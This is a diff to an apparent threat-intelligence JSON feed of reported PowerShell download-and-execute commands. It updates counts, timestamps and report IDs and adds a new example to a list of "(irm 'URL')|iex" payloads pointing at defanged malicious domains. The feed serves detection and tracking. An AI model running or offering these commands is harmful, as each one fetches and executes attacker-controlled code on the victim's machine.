@@ -250,10 +250,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 32,
-    "ReportCount": 32,
+    "DistinctPayloadCount": 33,
+    "ReportCount": 33,
     "FirstSeen": "2026-11-09T06:43:14.799000+00:00",
-    "LastSeen": "2026-11-14T01:19:02.441000+00:00",
+    "LastSeen": "2026-11-14T01:33:36.554000+00:00",
     "ReportIds": [
       "cmw8wa50e27cu0oml8fw7ot3c",
       "cmw90mp0b2ggo0omlygm6nltz",
@@ -286,7 +286,8 @@
       "cmwe9i80d0ahm0oml42mzaj6h",
       "cmwetnpgn0e5q0omlfbiurb7r",
       "cmwetonos0e7e0omltax78jeq",
-      "cmwfpwgss0ihy0omlygayvwid"
+      "cmwfpwgss0ihy0omlygayvwid",
+      "cmwfqf7a40ivv0oml8u89k1od"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/91d7167f548d874c')|iex",
@@ -305,6 +306,7 @@
       "(irm 'https://github[.]pw/Girya/ba63cf9b5b2960f2')|iex",
       "(irm 'https://github[.]pw/Girya/e12ead22eabdc1f7')|iex",
       "(irm 'https://github[.]pw/Girya/f65ffb293ce4cc02')|iex",
+      "(irm 'https://github[.]pw/click/41422c4edd1735b5')|iex",
       "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/3a8b7746765169c8')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/441fd4a04ee64f1b')|iex",
